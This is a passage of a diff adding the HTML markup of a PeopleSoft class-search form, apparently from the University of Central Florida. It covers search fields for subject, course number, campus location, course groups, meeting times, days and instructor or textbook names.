+<div id="win0divSUBJECT_TBL_DESCR$0"><span class="PSEDITBOX_DISPONLY" id="SUBJECT_TBL_DESCR$0"> </span></div>
+</td>
+</tr>
+<tr>
+<td colspan="5" height="21"></td>
+<td align="right" colspan="3" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SUBJECTlbl$0"><label class="PSEDITBOXLABEL" for="SSR_CLSRCH_WRK_SUBJECT$0" id="SSR_CLSRCH_WRK_SUBJECT_LBL$0">Subject</label></div>
+</td>
+</tr>
+<tr>
+<td colspan="5" height="4"></td>
+<td align="left" colspan="7" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_EXACT_MATCH1$1"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_EXACT_MATCH1$1" name="SSR_CLSRCH_WRK_SSR_EXACT_MATCH1$1" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="122">
+<option value=""> </option>
+<option selected="selected" value="C">contains</option>
+<option value="G">greater than or equal to</option>
+<option value="E">is exactly</option>
+<option value="T">less than or equal to</option>
+</select></div>
+</td>
+<td align="left" colspan="2" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_CATALOG_NBR$1"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_CATALOG_NBR$1" maxlength="10" name="SSR_CLSRCH_WRK_CATALOG_NBR$1" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','N',0);" style="width:56px; " tabindex="123" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="18"></td>
+<td align="right" colspan="3" rowspan="3" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_CATALOG_NBRlbl$1"><label class="PSEDITBOXLABEL" for="SSR_CLSRCH_WRK_CATALOG_NBR$1" id="SSR_CLSRCH_WRK_CATALOG_NBR_LBL$1">Course Number</label></div>
+</td>
+</tr>
+<tr>
+<td height="1"></td>
+<td colspan="6"></td>
+<td align="left" colspan="4" nowrap="nowrap" rowspan="4" valign="top">
+<div id="win0divDERIVED_AS_LBL_ES_EXAMPLE_LBL3$2"><a href="javascript:submitAction_win0(document.win0,'DERIVED_AS_LBL_ES_EXAMPLE_LBL3$2');" id="DERIVED_AS_LBL_ES_EXAMPLE_LBL3$2" name="DERIVED_AS_LBL_ES_EXAMPLE_LBL3$2" onclick="javascript:MOpopupObj_win0.StopPopup(); cancelBubble(event);" role="button" tabindex="217"><img alt="(example: statistics)" border="0" class="PSPUSHBUTTON_MO" id="DERIVED_AS_LBL_ES_EXAMPLE_LBL3$IMG$2" onkeydown="if (mouseoverHotkeyHandler(event)) MOpopupObj_win0.StartPopup('win0divDERIVED_AS_LBL_ES_EXAMPLE_LBL3$2', 'DERIVED_AS_LBL_ES_EXAMPLE_LBL3$2_24000_2745', 0, 0);" onmouseout="MOpopupObj_win0.StopPopup(); " onmouseover="MOpopupObj_win0.StartPopup('win0divDERIVED_AS_LBL_ES_EXAMPLE_LBL3$2', 'DERIVED_AS_LBL_ES_EXAMPLE_LBL3$2_24000_2745', 0, 0);" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PT_HELP_SWAN_1.gif" tabindex="217"/></a></div>
+<div id="DERIVED_AS_LBL_ES_EXAMPLE_LBL3$2_24000_2745" style="display:none; position:absolute; max-width:400px; top:0; left:0;"><span class="PTPOPUP_MSGHDR" style="display:block;">example: search by course title</span><br/>
+</div>
+</td>
+</tr>
+<tr>
+<td height="5"></td>
+<td rowspan="10"></td>
+<td align="left" colspan="4" nowrap="nowrap" rowspan="3" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_DESCR$2"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_DESCR$2" maxlength="30" name="SSR_CLSRCH_WRK_DESCR$2" style="width:229px; " tabindex="215" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="1"></td>
+<td align="right" rowspan="3" valign="top">
+<div id="win0divSR_LBL_WRK_COURSE_TITLElbl$2"><span class="PSEDITBOXLABEL">Course Keyword</span></div>
+</td>
+</tr>
+<tr>
+<td height="16"></td>
+<td colspan="2" rowspan="2"></td>
+<td align="left" rowspan="8" valign="top">
+<div id="win0divSR_LBL_WRK_COURSE_TITLE$2"><span class="PTTRANSPARENT" id="SR_LBL_WRK_COURSE_TITLE$2"> </span></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td align="left" colspan="9" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_ACAD_CAREER$3"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_ACAD_CAREER$3" name="SSR_CLSRCH_WRK_ACAD_CAREER$3" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="252">
+<option value=""> </option>
+<option value="GRAD">Graduate</option>
+<option value="MED">Medical</option>
+<option value="OTHR">Other Non-Degree</option>
+<option selected="selected" value="UGRD">Undergraduate</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="16"></td>
+<td align="right" colspan="2" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_ACAD_CAREERlbl$3"><label class="PSDROPDOWNLABEL" for="SSR_CLSRCH_WRK_ACAD_CAREER$3" id="SSR_CLSRCH_WRK_ACAD_CAREER_LBL$3">Course Career</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td rowspan="3"></td>
+<td align="left" colspan="9" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_LOCATION$4"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_LOCATION$4" name="SSR_CLSRCH_WRK_LOCATION$4" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="353">
+<option selected="selected" value=""> </option>
+<option value="EXECDEVCTR">Executive Development Center</option>
+<option value="MAIN">Main Campus (Orlando)</option>
+<option value="MAIN-OFF">Main Off Campus</option>
+<option value="ONLINE-UCF">Online</option>
+<option value="ALTSPRNG">UCF Altamonte Springs</option>
+<option value="CENTRALOFF">UCF Central Region Off Campus</option>
+<option value="COCOA">UCF Cocoa</option>
+<option value="DAYTONA">UCF Daytona Beach</option>
+<option value="UCFDOWNTN">UCF Downtown</option>
+<option value="LEESBURG">UCF Leesburg</option>
+<option value="OCALA">UCF Ocala</option>
+<option value="EXPOCNTR">UCF Orlando Expo Center</option>
+<option value="PALM BAY">UCF Palm Bay</option>
+<option value="RSNHSPMG">UCF Rosen Col - Universal Blvd</option>
+<option value="RSN-OFF">UCF Rosen College Off Campus</option>
+<option value="LAKE MARY">UCF Sanford/Lake Mary</option>
+<option value="SOUTH LAKE">UCF South Lake</option>
+<option value="VAL-EAST">UCF Valencia East</option>
+<option value="OSCEOLA">UCF Valencia Osceola</option>
+<option value="VAL-SPS">UCF Valencia Schl Pub Safety</option>
+<option value="METROWEST">UCF Valencia West</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="16"></td>
+<td align="right" colspan="2" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_LOCATIONlbl$4"><label class="PSDROPDOWNLABEL" for="SSR_CLSRCH_WRK_LOCATION$4" id="SSR_CLSRCH_WRK_LOCATION_LBL$4">Location</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td rowspan="2"></td>
+<td align="left" colspan="8" rowspan="2" valign="top">
+<div id="win0divATTR_VAL$5"><select class="PSDROPDOWNLIST" id="ATTR_VAL$5" name="ATTR_VAL$5" size="1" style="width:228px; " tabindex="433">
+<option selected="selected" value=""> </option>
+<option value="AGINGSTDY">Aging Studies</option>
+<option value="BLENDFLEX">Blendflex</option>
+<option value="BUSCOMMPGM">Business Common Program</option>
+<option value="BUSCORE">Business Core</option>
+<option value="DIVERSITY">Diversity Requirement</option>
+<option value="GEPCOMM">GEP-Communcation Foundations</option>
+<option value="GEPCULHIST">GEP-Cultural&amp;Historical Found</option>
+<option value="GEPMATH">GEP-Mathematical Foundations</option>
+<option value="GEPSCIENCE">GEP-Science Foundations</option>
+<option value="GEPSOCIAL">GEP-Social Foundations</option>
+<option value="GRICP">GR Intrnshp, Clinical, Pract</option>
+<option value="GRM">Gordon Rule Math</option>
+<option value="GRW">Gordon Rule Writing</option>
+<option value="CAPSTONE">HIP - Capstone</option>
+<option value="GLBLRNG">HIP - Global Learning</option>
+<option value="INTGRTEXP">HIP - Integrative Experience</option>
+<option value="RSCHINTNSV">HIP - Research Intensive</option>
+<option value="SERVICELRN">HIP - Service Learning</option>
+<option value="STYABDXCHN">HIP - Study Abroad Exchange</option>
+<option value="UGICP">HIP - UG Intrnshp, Clncl, Prct</option>
+<option value="STYABDSHOR">HIP -Study Abroad Short Term</option>
+<option value="HONORS">Honors Classes</option>
+<option value="LINK">Link Classes</option>
+<option value="NURPGMPREQ">Nursing Program Pre-Requisites</option>
+<option value="PAL">Personalized Adaptive Learning</option>
+<option value="SPLT">Split level course</option>
+<option value="SCHIST">State Core Cltral/Histrcl</option>
+<option value="SCMATH">State Core Math</option>
+<option value="SCSCIENCE">State Core Science</option>
+<option value="SCSOCIAL">State Core Social</option>
+<option value="UGRESEARCH">Undergraduate Research</option>
+<option value="WOMENSTDY">Women's Studies</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="13"></td>
+<td align="right" colspan="3" rowspan="2" valign="top">
+<div id="win0divATTR_VALlbl$5"><label class="PSDROPDOWNLABEL" for="ATTR_VAL$5" id="ATTR_VAL_LBL$5">Special Course Group</label></div>
+</td>
+</tr>
+<tr>
+<td height="19"></td>
+<td align="left" colspan="9" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_OPEN_ONLY$6"><input id="SSR_CLSRCH_WRK_SSR_OPEN_ONLY$chk$6" name="SSR_CLSRCH_WRK_SSR_OPEN_ONLY$chk$6" type="hidden" value="Y"/><input checked="checked" class="PSCHECKBOX" id="SSR_CLSRCH_WRK_SSR_OPEN_ONLY$6" name="SSR_CLSRCH_WRK_SSR_OPEN_ONLY$6" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_SSR_OPEN_ONLY$chk$6.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="445" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_SSR_OPEN_ONLY$6" id="SSR_CLSRCH_WRK_SSR_OPEN_ONLY_LBL$6">Show Open Classes Only</label></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="3" height="3"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="4" height="4"></td>
+</tr>
+<tr>
+<td height="21"></td>
+<td align="left" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$1">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="503">
+<tr>
+<td align="left" class="PAGROUPBOXLABELINVISIBLE">Additional Search Criteria</td>
+</tr>
+<tr>
+<td width="501">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="4" id="ACE_DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$1" role="presentation" style="border-style:none" width="501">
+<tr>
+<td height="0" width="3"></td>
+<td width="16"></td>
+<td width="250"></td>
+<td width="232"></td>
+</tr>
+<tr>
+<td height="1"></td>
+<td align="left" nowrap="nowrap" rowspan="3" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$1"><a href="javascript:submitAction_win0(document.win0,'DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$1');" id="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$1" name="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$1" onclick="javascript:cancelBubble(event);" role="button" tabindex="517"><img alt="Additional Search Criteria" border="0" id="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$IMG$1" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PS_COLLAPSE_ICN_1.gif" title="Additional Search Criteria"/></a></div>
+</td>
+</tr>
+<tr>
+<td height="2"></td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$255$lbl$1"><span class="PSEDITBOXLABEL">Additional Search Criteria</span></div>
+</td>
+</tr>
+<tr>
+<td height="13"></td>
+<td align="left" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$255$$1"><span class="PTTRANSPARENT" id="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$255$$1"> </span></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td height="412"></td>
+<td align="left" colspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_GROUP_BOX_1$1">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="1072">
+<tr>
+<td width="1070">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="3" id="ACE_DERIVED_CLSRCH_SSR_GROUP_BOX_1$1" role="presentation" style="border-style:none" width="1070">
+<tr>
+<td height="0" width="3"></td>
+<td width="1060"></td>
+<td width="7"></td>
+</tr>
+<tr>
+<td height="409"></td>
+<td align="left" valign="top">
+<div id="win0div$ICField232$1">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" id="$ICField232$scrolli$1" onclick="getScrollTableId('$ICField232$scrolli$1')" width="1059">
+<tr>
+<td width="1057">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="23" id="ACE_$ICField232$1" role="presentation" style="border-style:none" width="1057">
+<tr>
+<td height="8" width="0"></td>
+<td width="216"></td>
+<td width="3"></td>
+<td width="1"></td>
+<td width="1"></td>
+<td width="2"></td>
+<td width="1"></td>
+<td width="1"></td>
+<td width="1"></td>
+<td width="1"></td>
+<td width="2"></td>
+<td width="46"></td>
+<td width="17"></td>
+<td width="79"></td>
+<td width="63"></td>
+<td width="4"></td>
+<td width="21"></td>
+<td width="20"></td>
+<td width="4"></td>
+<td width="42"></td>
+<td width="63"></td>
+<td width="67"></td>
+<td width="402"></td>
+</tr>
+<tr>
+<td colspan="9" height="4"></td>
+<td align="left" colspan="9" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_START_TIME_OPR$7"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_START_TIME_OPR$7" name="SSR_CLSRCH_WRK_SSR_START_TIME_OPR$7" onchange="addchg_win0(this);submitAction_win0(this.form,this.id);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="544">
+<option value=""> </option>
+<option value="BT">between</option>
+<option value="GT">greater than</option>
+<option selected="selected" value="GE">greater than or equal to</option>
+<option value="E">is exactly</option>
+<option value="LT">less than</option>
+<option value="LE">less than or equal to</option>
+</select></div>
+</td>
+<td align="left" colspan="5" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_MEETING_TIME_START$7"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_MEETING_TIME_START$7" maxlength="7" name="SSR_CLSRCH_WRK_MEETING_TIME_START$7" onchange="addchg_win0(this);oChange_win0=this;" style="width:56px; " tabindex="545" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="20"></td>
+<td align="right" colspan="3" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_MEETING_TIME_STARTlbl$7"><label class="PSEDITBOXLABEL" for="SSR_CLSRCH_WRK_MEETING_TIME_START$7" id="SSR_CLSRCH_WRK_MEETING_TIME_START_LBL$7">Meeting Start Time</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td colspan="5"></td>
+<td align="left" colspan="9" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_END_TIME_OPR$7"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_END_TIME_OPR$7" name="SSR_CLSRCH_WRK_SSR_END_TIME_OPR$7" onchange="addchg_win0(this);submitAction_win0(this.form,this.id);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="547">
+<option value=""> </option>
+<option value="BT">between</option>
+<option value="GT">greater than</option>
+<option value="GE">greater than or equal to</option>
+<option value="E">is exactly</option>
+<option value="LT">less than</option>
+<option selected="selected" value="LE">less than or equal to</option>
+</select></div>
+</td>
+<td align="left" colspan="5" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_MEETING_TIME_END$7"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_MEETING_TIME_END$7" maxlength="7" name="SSR_CLSRCH_WRK_MEETING_TIME_END$7" onchange="addchg_win0(this);oChange_win0=this;" style="width:56px; " tabindex="548" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="20"></td>
+<td align="right" colspan="4" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_MEETING_TIME_ENDlbl$7"><label class="PSEDITBOXLABEL" for="SSR_CLSRCH_WRK_MEETING_TIME_END$7" id="SSR_CLSRCH_WRK_MEETING_TIME_END_LBL$7">Meeting End Time</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td colspan="4"></td>
+<td align="left" colspan="14" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_INCLUDE_CLASS_DAYS$8"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_INCLUDE_CLASS_DAYS$8" name="SSR_CLSRCH_WRK_INCLUDE_CLASS_DAYS$8" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="614">
+<option value=""> </option>
+<option value="F">exclude any of these days</option>
+<option value="E">exclude only these days</option>
+<option value="J">include any of these days</option>
+<option selected="selected" value="I">include only these days</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="19"></td>
+<td align="right" colspan="5" rowspan="4" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_INCLUDE_CLASS_DAYSlbl$8"><label class="PSDROPDOWNLABEL" for="SSR_CLSRCH_WRK_INCLUDE_CLASS_DAYS$8" id="SSR_CLSRCH_WRK_INCLUDE_CLASS_DAYS_LBL$8">Days of Week</label></div>
+</td>
+</tr>
+<tr>
+<td height="1"></td>
+<td colspan="16"></td>
+<td align="left" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SUN$8"><input id="SSR_CLSRCH_WRK_SUN$chk$8" name="SSR_CLSRCH_WRK_SUN$chk$8" type="hidden" value=""/><input class="PSCHECKBOX" id="SSR_CLSRCH_WRK_SUN$8" name="SSR_CLSRCH_WRK_SUN$8" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_SUN$chk$8.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="621" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_SUN$8" id="SSR_CLSRCH_WRK_SUN_LBL$8">Sun</label></div>
+</td>
+</tr>
+<tr>
+<td height="28"></td>
+<td colspan="4" rowspan="4"></td>
+<td align="left" colspan="3" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_MON$8"><input id="SSR_CLSRCH_WRK_MON$chk$8" name="SSR_CLSRCH_WRK_MON$chk$8" type="hidden" value=""/><input class="PSCHECKBOX" id="SSR_CLSRCH_WRK_MON$8" name="SSR_CLSRCH_WRK_MON$8" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_MON$chk$8.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="615" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_MON$8" id="SSR_CLSRCH_WRK_MON_LBL$8">Mon</label></div>
+</td>
+<td align="left" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_TUES$8"><input id="SSR_CLSRCH_WRK_TUES$chk$8" name="SSR_CLSRCH_WRK_TUES$chk$8" type="hidden" value=""/><input class="PSCHECKBOX" id="SSR_CLSRCH_WRK_TUES$8" name="SSR_CLSRCH_WRK_TUES$8" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_TUES$chk$8.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="616" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_TUES$8" id="SSR_CLSRCH_WRK_TUES_LBL$8">Tues</label></div>
+</td>
+<td align="left" colspan="2" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_WED$8"><input id="SSR_CLSRCH_WRK_WED$chk$8" name="SSR_CLSRCH_WRK_WED$chk$8" type="hidden" value=""/><input class="PSCHECKBOX" id="SSR_CLSRCH_WRK_WED$8" name="SSR_CLSRCH_WRK_WED$8" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_WED$chk$8.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="617" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_WED$8" id="SSR_CLSRCH_WRK_WED_LBL$8">Wed</label></div>
+</td>
+<td align="left" colspan="4" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_THURS$8"><input id="SSR_CLSRCH_WRK_THURS$chk$8" name="SSR_CLSRCH_WRK_THURS$chk$8" type="hidden" value=""/><input class="PSCHECKBOX" id="SSR_CLSRCH_WRK_THURS$8" name="SSR_CLSRCH_WRK_THURS$8" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_THURS$chk$8.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="618" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_THURS$8" id="SSR_CLSRCH_WRK_THURS_LBL$8">Thurs</label></div>
+</td>
+<td align="left" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_FRI$8"><input id="SSR_CLSRCH_WRK_FRI$chk$8" name="SSR_CLSRCH_WRK_FRI$chk$8" type="hidden" value=""/><input class="PSCHECKBOX" id="SSR_CLSRCH_WRK_FRI$8" name="SSR_CLSRCH_WRK_FRI$8" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_FRI$chk$8.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="619" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_FRI$8" id="SSR_CLSRCH_WRK_FRI_LBL$8">Fri</label></div>
+</td>
+<td align="left" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SAT$8"><input id="SSR_CLSRCH_WRK_SAT$chk$8" name="SSR_CLSRCH_WRK_SAT$chk$8" type="hidden" value=""/><input class="PSCHECKBOX" id="SSR_CLSRCH_WRK_SAT$8" name="SSR_CLSRCH_WRK_SAT$8" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_SAT$chk$8.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="620" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_SAT$8" id="SSR_CLSRCH_WRK_SAT_LBL$8">Sat</label></div>
+</td>
+</tr>
+<tr>
+<td height="5"></td>
+<td align="left" colspan="5" rowspan="3" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_EXACT_MATCH2$9"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_EXACT_MATCH2$9" name="SSR_CLSRCH_WRK_SSR_EXACT_MATCH2$9" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:207px; " tabindex="690">
+<option value=""> </option>
+<option selected="selected" value="B">begins with</option>
+<option value="C">contains</option>
+<option value="E">is exactly</option>
+</select></div>
+</td>
+<td colspan="2" rowspan="3"></td>
+<td align="left" colspan="6" nowrap="nowrap" rowspan="4" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_LAST_NAME$9"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_LAST_NAME$9" maxlength="30" name="SSR_CLSRCH_WRK_LAST_NAME$9" style="width:184px; " tabindex="691" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="1"></td>
+<td align="right" colspan="3" rowspan="3" valign="top">
+<div id="win0divSR_LBL_WRK_INSTRCTOR_LBLlbl$9"><span class="PSEDITBOXLABEL">Instructor Last Name</span></div>
+</td>
+</tr>
+<tr>
+<td height="16"></td>
+<td colspan="2" rowspan="11"></td>
+<td align="left" rowspan="24" valign="top">
+<div id="win0divSR_LBL_WRK_INSTRCTOR_LBL$9"><span class="PTTRANSPARENT" id="SR_LBL_WRK_INSTRCTOR_LBL$9"> </span></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td colspan="3"></td>
+<td align="left" colspan="8" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$10"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$10" name="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$10" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:207px; " tabindex="779">
+<option value=""> </option>
+<option selected="selected" value="B">begins with</option>
+<option value="C">contains</option>
+<option value="E">is exactly</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="28"></td>
+<td align="right" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NMlbl$10"><span class="PSDROPDOWNLABEL">Instructor First Name</span></div>
+</td>
+<td colspan="2" rowspan="9"></td>
+<td colspan="2" rowspan="9"></td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$10"><span class="PTTRANSPARENT" id="SSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$10">Instructor First Name</span></div>
+</td>
+<td align="left" colspan="6" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$10"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$10" maxlength="50" name="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$10" style="width:184px; " tabindex="783" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td align="left" colspan="8" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$11"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$11" name="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$11" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:207px; " tabindex="843">
+<option value=""> </option>
+<option selected="selected" value="B">begins with</option>
+<option value="C">contains</option>
+<option value="E">is exactly</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="28"></td>
+<td align="right" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NMlbl$11"><span class="PSDROPDOWNLABEL">Textbook Title</span></div>
+</td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$11"><span class="PTTRANSPARENT" id="SSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$11">Textbook Title</span></div>
+</td>
+<td align="left" colspan="6" nowrap="nowrap" rowspan="2" valign="top">
